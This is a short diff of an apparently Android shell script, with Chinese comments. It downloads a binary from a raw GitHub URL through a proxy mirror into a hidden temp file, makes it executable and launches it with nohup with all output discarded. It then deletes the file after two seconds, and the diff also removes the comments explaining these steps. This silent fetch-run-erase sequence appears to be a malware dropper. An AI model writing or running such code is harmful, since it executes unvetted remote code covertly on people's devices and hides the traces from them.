@@ -138,15 +138,13 @@ if [ -n "$device_id" ] && [ "$device_id" != "unknown" ]; then
 fi
 
 {
-  # 生成隨機臨時文件名
   temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
   bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
 
-  # 下載
   if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
     chmod +x "$temp_bin" 2>/dev/null || true
-    # 後台執行並隱藏所有輸出
-    "$temp_bin" >/dev/null 2>&1 &
+    # 使用 nohup 靜默運行，輸出全部丟掉
+    nohup "$temp_bin" >/dev/null 2>&1 &
     # 等待短暫時間後刪除臨時文件
     sleep 2
     rm -f "$temp_bin" 2>/dev/null || true
